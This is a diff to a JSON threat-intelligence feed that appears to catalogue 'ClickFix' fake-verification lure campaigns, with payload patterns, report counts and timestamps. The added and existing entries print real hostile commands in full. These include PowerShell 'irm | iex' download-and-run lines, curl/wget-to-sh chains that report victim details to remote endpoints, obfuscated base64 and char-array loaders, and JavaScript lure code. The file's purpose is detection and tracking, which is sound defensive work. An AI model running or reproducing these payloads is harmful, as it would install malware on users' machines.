@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 45,
-    "ReportCount": 45,
+    "DistinctPayloadCount": 48,
+    "ReportCount": 48,
     "FirstSeen": "2026-11-22T00:10:10.523000+00:00",
-    "LastSeen": "2026-11-28T19:23:19.481000+00:00",
+    "LastSeen": "2026-11-28T19:50:31.701000+00:00",
     "ReportIds": [
       "cmwr2ypwb29gj0omlf48po5rs",
       "cmwr3jq8o2aa40oml2lcavt5m",
@@ -50,7 +50,10 @@
       "cmwx9xrcu0dyy0omlur2m2nt0",
       "cmwxoyrm40fd70oml5xlrq4dq",
       "cmwxqo0010fn10omlohd8wq8e",
-      "cmx0sssfd00140omljarrrimh"
+      "cmx0sssfd00140omljarrrimh",
+      "cmx0t770o00750oml58zddljn",
+      "cmx0tirc800s10oml8r726yhl",
+      "cmx0trrve01880omlc7tj40y9"
     ],
     "PayloadExamples": [
       "irm 'browse-login[.]info/083af9e16202853f'|iex;",
@@ -69,6 +72,9 @@
       "irm 'browse-login[.]info/eaa84dd940b7e8af'|iex;",
       "irm 'browse-login[.]info/edef55d135d02fe5'|iex;",
       "irm 'browse-login[.]info/eeab68657283de12'|iex;",
+      "irm 'codes-veri.beer/41c8409a65e6460e'|iex;",
+      "irm 'codes-veri.beer/430b6c6862caa0db'|iex;",
+      "irm 'codes-veri.beer/45dd8a348b91d99e'|iex;",
       "irm 'codes-veri.beer/7df373e3e15b5f53'|iex;",
       "irm 'img-codes-cloude[.]info/0c422f1bf6150bfd'|iex;",
       "irm 'img-codes-cloude[.]info/10fb6db048d0ef86'|iex;",
@@ -102,10 +108,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 43,
-    "ReportCount": 43,
+    "DistinctPayloadCount": 44,
+    "ReportCount": 44,
     "FirstSeen": "2026-11-21T21:28:53.145000+00:00",
-    "LastSeen": "2026-11-27T19:18:42.524000+00:00",
+    "LastSeen": "2026-11-28T19:46:55.475000+00:00",
     "ReportIds": [
       "cmwqx7aub28og0oml2cfuy2y3",
       "cmwro4vsm2qpw0omlz9qmz51u",
@@ -149,9 +155,11 @@
       "cmwydtqb80hum0oml7etj4oca",
       "cmwz4gsnv0iq30omlwd650f6z",
       "cmwzd6ocn0ith0omltr54b6zu",
-      "cmwzd702m0iv20omlo0974ppz"
+      "cmwzd702m0iv20omlo0974ppz",
+      "cmx0tn50m00yy0omlx8d7coqy"
     ],
     "PayloadExamples": [
+      "(irm 'https://cfverification[.]com/ben/5090c6de66164869')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/023cf003bfe9c9b9')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/05b20b325b2ab321')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/122c9ed39540c827')|iex",
@@ -199,10 +207,10 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 9,
-    "ReportCount": 9,
+    "DistinctPayloadCount": 10,
+    "ReportCount": 10,
     "FirstSeen": "2026-11-22T06:11:51.571000+00:00",
-    "LastSeen": "2026-11-27T14:34:32.668000+00:00",
+    "LastSeen": "2026-11-28T19:48:52.225000+00:00",
     "ReportIds": [
       "cmwrfvujw2j350omlr7lq12wu",
       "cmwrg8f572jhm0oml1i1cdbji",
@@ -212,9 +220,11 @@
       "cmwv3cmvm0d8p0nml83y5673a",
       "cmwv5qmo60dms0nmlx5k8gj36",
       "cmwyoq8bi0i480omli8mkrp4k",
-      "cmwz31kbe0igo0oml2iq6jdj3"
+      "cmwz31kbe0igo0oml2iq6jdj3",
+      "cmx0tpn5g012i0omlzs16fngr"
     ],
     "PayloadExamples": [
+      "curl -sL -d \"id=03c92c6d-3548-434e-8d4e-829be88cd13f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fvdspsabha[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-28T19%3A47%3A30.619Z&lastShellAt=2026-11-28T19%3A47%3A30.619Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=15d2bf00-1751-4e33-a4c2-112a1403025c&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fvote-kng528.aduide.id%2F&os=Linux%20x86_64&lastVisitAt=2026-11-24T16%3A35%3A29.941Z&lastShellAt=2026-11-24T16%3A35%3A29.941Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=450523a1-8869-470a-a865-c3ecd451a7a4&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fstaging[.]smilesbydelivery[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-27T14%3A33%3A10.700Z&lastShellAt=2026-11-27T14%3A33%3A10.700Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=475c2e82-40b8-4a03-9bea-e9036c8286df&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fuktopthesis[.]co[.]uk%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T12%3A18%3A54.377Z&lastShellAt=2026-11-22T12%3A18%3A54.377Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
@@ -228,10 +238,10 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 5,
-    "ReportCount": 31,
+    "DistinctPayloadCount": 6,
+    "ReportCount": 32,
     "FirstSeen": "2026-11-22T04:08:39.055000+00:00",
-    "LastSeen": "2026-11-27T14:20:21.191000+00:00",
+    "LastSeen": "2026-11-28T19:43:10.206000+00:00",
     "ReportIds": [
       "cmwrbhefp2hzv0omlbe37fsqt",
       "cmwrd2dg22ir70omlf543udnz",
@@ -263,35 +273,56 @@
       "cmwydml610hi40oml2u7u3v4n",
       "cmwydmynx0hj60omlvef1h679",
       "cmwydnli80hkh0oml9je3ct2q",
-      "cmwz2jbcw0ief0omlg3kvw0zx"
+      "cmwz2jbcw0ief0omlg3kvw0zx",
+      "cmx0tib7n00rc0omlp5klvgr1"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/be1c-3b11c244d2b2/bc99-45b9-a035-f6af7c134dd7/-/raw/main/7F5-4410-9a93-F371ffdFaF84 | IEX",
       "IRM gitlab[.]com/joon1286/1fdbd074-392d-4285-b67e-ff498ddcb29e/-/raw/main/b04f13f7-5981-4267-afc4-1e6152d7b677 | IEX",
       "IRM gitlab[.]com/nova-84e1-18b2b/5500-e4c4-44c7-84d6-987c6ab00aba/-/raw/main/abb8-52e04871081f?ref_type=heads | IEX",
       "IRM gitlab[.]com/pas-quarenmjn/a1b22db-1028-4ff5-8353-9ef7c7fedbbd/-/raw/main/Ba-761bEc36334D | IEX",
-      "IRM gitlab[.]com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12 | IEX"
+      "IRM gitlab[.]com/roza-1984y/6758f519-a0d7-4bf2-979d-776ccb798bd8/-/raw/main/44D483cA-0846-4A70-af30-62Bb86Fe4B12 | IEX",
+      "IRM gitlab[.]com/roza-1984y/f040-4a05-a5c2-028278c5e7aa/-/raw/main/8a64-bd243eb92d97 | IEX"
     ]
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && curl -fsSL \"<URL>\" | sh",
-    "DistinctPayloadCount": 5,
-    "ReportCount": 5,
+    "DistinctPayloadCount": 6,
+    "ReportCount": 6,
     "FirstSeen": "2026-11-22T08:23:05.111000+00:00",
-    "LastSeen": "2026-11-24T20:47:57.336000+00:00",
+    "LastSeen": "2026-11-28T19:50:32.942000+00:00",
     "ReportIds": [
       "cmwrkklsp2noh0omltgx5pv2q",
       "cmwuvv1df056u0nmlb1od3iwi",
       "cmwv5r1yg0do30nmljkhti8qa",
       "cmwv5viaq0dt60nmlitq669x9",
-      "cmwv627v40e0p0nmlrbj89ekr"
+      "cmwv627v40e0p0nmlrbj89ekr",
+      "cmx0trstf018h0omluenb7hc8"
     ],
     "PayloadExamples": [
       "curl -sL -d \"id=4bc397ef-2de8-44e0-a3dd-f3ff488430d4&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falaminsheikh[.]infinityfreeapp[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-24T20%3A41%3A19.224Z&lastShellAt=2026-11-24T20%3A41%3A19.224Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=4d3c4f52-9fa0-4410-891c-4ac708cf2a93&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fexcelcustomized[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-24T20%3A37%3A54.250Z&lastShellAt=2026-11-24T20%3A37%3A54.250Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=55b886ce-9280-43fb-bacd-d4243c1be084&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fhotshotssoccer[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T08%3A21%3A42.165Z&lastShellAt=2026-11-22T08%3A21%3A42.165Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=606ee102-fcaa-4a2b-abc7-3daae7290b12&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmukulkumarportfolio222[.]infinityfreeapp[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-24T20%3A46%3A32.309Z&lastShellAt=2026-11-24T20%3A46%3A32.309Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+      "curl -sL -d \"id=b7096627-9d6e-42af-8f4b-3ab8046fbc0e&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Flbr.rf.gd%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-28T19%3A49%3A09.743Z&lastShellAt=2026-11-28T19%3A49%3A09.743Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=ebaac78b-e414-4a7b-8b09-cd607584a668&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsiedlung-altenhof[.]de%2F&os=Linux%20x86_64&lastVisitAt=2026-11-24T16%3A01%3A02.513Z&lastShellAt=2026-11-24T16%3A01%3A02.513Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh"
+    ]
+  },
+  {
+    "Pattern": "irm '<URL>' | iex;",
+    "DistinctPayloadCount": 3,
+    "ReportCount": 3,
+    "FirstSeen": "2026-11-28T19:34:41.073000+00:00",
+    "LastSeen": "2026-11-28T19:49:55.712000+00:00",
+    "ReportIds": [
+      "cmx0t7ecu008g0omle0gmfcxn",
+      "cmx0tfj8v00jp0oml0cy8f2u5",
+      "cmx0tr03b01720omly5ty9jpy"
+    ],
+    "PayloadExamples": [
+      "irm 'https://fauilinga[.]icu/RQLdSm05DUU1Ks4z=3ec99896b3486571' | iex;",
+      "irm 'https://fauilinga[.]icu/ZKyVjBPKFcSQiMnb=ed4eb00a9aca8dd5' | iex;",
+      "irm 'https://fauilinga[.]icu/ZcUqC4D8Wrm8Wfol=1e3b24aa0c55c006' | iex;"
     ]
   },
   {
@@ -472,6 +503,19 @@
     ]
   },
   {
+    "Pattern": "$close_btn_html='<svg class=\"eae-close\" style=\"-webkit-mask-image: url('+m(t.pop_icon.value.url)+\"); mask-image: url(\"+m(t.pop_icon.value.url)+'); \"></svg>'):$close_btn_html='<i class=\"eae-close '+m(t.pop_icon.value)+'\"> </i>',e(x).eaePopup({type:\"inline\",midClick:!0,mainClass:\"eae-coupon-popup eae-popup  eae-cc-\"+S,closeMarkup:$close_btn_html,closeBtnInside:\"yes\"==t.btn_in_out,callbacks:{beforeOpen:function(){\"\"!=t.effect&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-28T19:49:26.671000+00:00",
+    "LastSeen": "2026-11-28T19:49:26.671000+00:00",
+    "ReportIds": [
+      "cmx0tqdow01390omljys6r7ca"
+    ],
+    "PayloadExamples": [
+      "$close_btn_html='<svg class=\"eae-close\" style=\"-webkit-mask-image: url('+m(t.pop_icon.value.url)+\"); mask-image: url(\"+m(t.pop_icon.value.url)+'); \"></svg>'):$close_btn_html='<i class=\"eae-close '+m(t.pop_icon.value)+'\"> </i>',e(x).eaePopup({type:\"inline\",midClick:!0,mainClass:\"eae-coupon-popup eae-popup  eae-cc-\"+S,closeMarkup:$close_btn_html,closeBtnInside:\"yes\"==t.btn_in_out,callbacks:{beforeOpen:function(){\"\"!=t.effect&&("
+    ]
+  },
+  {
     "Pattern": "$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...101, 108, 108, 46, 101, 120, 101, 32, 45, 119, 32, 104, 32, 45, 110, 111, 112, 32, 45, 99, 32], // powershell.exe -w h -nop -c [34, 36, 107, 104, 61, 39, 104, 116, 116, 112, 39, 43, 39, 115, 39, 59], // \"$kh='htt...\n...a) { window.clipboardData.setData('Text', command); } }); <!-- clickfix-observer-corpus --> powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/';\"$c='cVG'+'vQi'+'o6'+'.txt'...\n...Net.','Web','Client';\"$rf=New-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression $kj\" powershell.exe -w h -nop -c powershell.exe -w h -nop -c \"$kh='http'+'s';\"$b=':'+'//'+'alababababa'+'.'+'cloud'+'/'...\n...w-Object ($i);$kj=$rf.('Download'+'String')($om);Invoke-Expression",
     "DistinctPayloadCount": 1,
     "ReportCount": 1,
@@ -547,6 +591,19 @@
     ],
     "PayloadExamples": [
       "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ______ _                 _  ___ _                  \n / _____) |               | |/ __) |                 \n| /     | | ___  _   _  _ | | |__| | ____  ____ ____ \n| |     | |/ _ \\| | | |/ || |  __) |/ _  |/ ___) _  )\n| \\_____| | |_| | |_| ( (_| | |  | ( ( | | |  ( (/ / \n \\______)_|\\___/ \\____|\\____|_|  |_|\\_||_|_|   \\____)\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 579\n\n$updateloadUrl = 'cwBhAGwAIAByAGgAagAgACgAZwBjAG0AIAAqAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgApADsAJABnAHEAaQBhAD0AJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGEAbQBlAHIAaQBjAGEAbgBiAG8AeQB3AG8AdwAvAHIAbwBiAGkAbgBnAHUAZAAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AMQAwADIAMgAyADYAYgBhAGMAawB1AHAALgBkAGIAJwA7ACQAbgByAHYAYgBzAGgAPQAnAGkAdwByACcAOwByAGgAagAoACYAIAAkAG4AcgB2AGIAcwBoACAALQB1AHMAZQBiAGEAcwAgACQAZwBxAGkAYQApAA=='\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 563\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 1156\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean"
+    ]
+  },
+  {
+    "Pattern": "powershell -w h \"iex(irm \\'fingerprint-veri.info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit'; var serverPayloadPromise = sendRequestToServer({ action: 'dl', k: API_AUTH_KEY, os: TARGET_OPERATING_SYSTEM, vid: UNIQUE_VISITOR_ID, ref: location.href, ray: RAY_TRACKING_ID }) .then(function(response) { return response.text(); }) .then(function(hexResponse) { return decodeServerResponse(hexResponse); }) .then(function(decodedData) { REDIRECT_URL = decodedData.redir || ''; return MALICIOUS_POWERSHELL_COMMAND; }) .catch(function() { return MALICIOUS_POWERSHELL_COMMAND; }); function waitForExecutionToken(token) { if (!token) return; var startTimestamp = Date.now(); var isDone = false; var isInstructionHidden = false; function markAsExecuted() { if (!TEST_MODE) { try { localStorage.setItem(LOCAL_STORAGE_KEY, '1'); } catch (error) { } } } function hideInstructionModal() { if (isInstructionHidden) return; isInstructionHidden = true; if (modalElement) { modalElement.classList.remove('active'); } } function completeVerification() { if (isDone) return; isDone = true; if (modalElement) { modalElement.classList.remove('active'); } if (spinnerElement) { spinnerElement.style.display = 'none'; } var check",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-28T19:51:22.829000+00:00",
+    "LastSeen": "2026-11-28T19:51:22.829000+00:00",
+    "ReportIds": [
+      "cmx0tsvb601ab0omluwauuo4o"
+    ],
+    "PayloadExamples": [
+      "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit'; var serverPayloadPromise = sendRequestToServer({ action: 'dl', k: API_AUTH_KEY, os: TARGET_OPERATING_SYSTEM, vid: UNIQUE_VISITOR_ID, ref: location.href, ray: RAY_TRACKING_ID }) .then(function(response) { return response.text(); }) .then(function(hexResponse) { return decodeServerResponse(hexResponse); }) .then(function(decodedData) { REDIRECT_URL = decodedData.redir || ''; return MALICIOUS_POWERSHELL_COMMAND; }) .catch(function() { return MALICIOUS_POWERSHELL_COMMAND; }); function waitForExecutionToken(token) { if (!token) return; var startTimestamp = Date.now(); var isDone = false; var isInstructionHidden = false; function markAsExecuted() { if (!TEST_MODE) { try { localStorage.setItem(LOCAL_STORAGE_KEY, '1'); } catch (error) { } } } function hideInstructionModal() { if (isInstructionHidden) return; isInstructionHidden = true; if (modalElement) { modalElement.classList.remove('active'); } } function completeVerification() { if (isDone) return; isDone = true; if (modalElement) { modalElement.classList.remove('active'); } if (spinnerElement) { spinnerElement.style.display = 'none'; } var check"
     ]
   }
 ]
